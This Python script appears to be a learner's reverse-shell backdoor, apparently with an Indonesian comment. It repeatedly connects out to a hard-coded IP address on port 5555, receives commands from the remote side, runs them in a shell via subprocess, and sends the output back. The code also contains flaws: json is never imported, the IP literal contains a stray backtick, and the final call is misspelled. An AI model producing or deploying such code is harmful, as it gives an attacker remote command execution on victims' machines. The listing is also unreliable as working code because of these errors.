import socket
import time
import subprocess


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try: 
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError: 
            continue

def connection():
    while True:
        time.sleep(20)
        try: 
            s.connect(('10.3`0.90.14', 5555))
            shell()
            s.close
            break
        except:
            connection() 

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        else: 
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            #parameter yang penting untuk variabel subprocess
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conncetion()
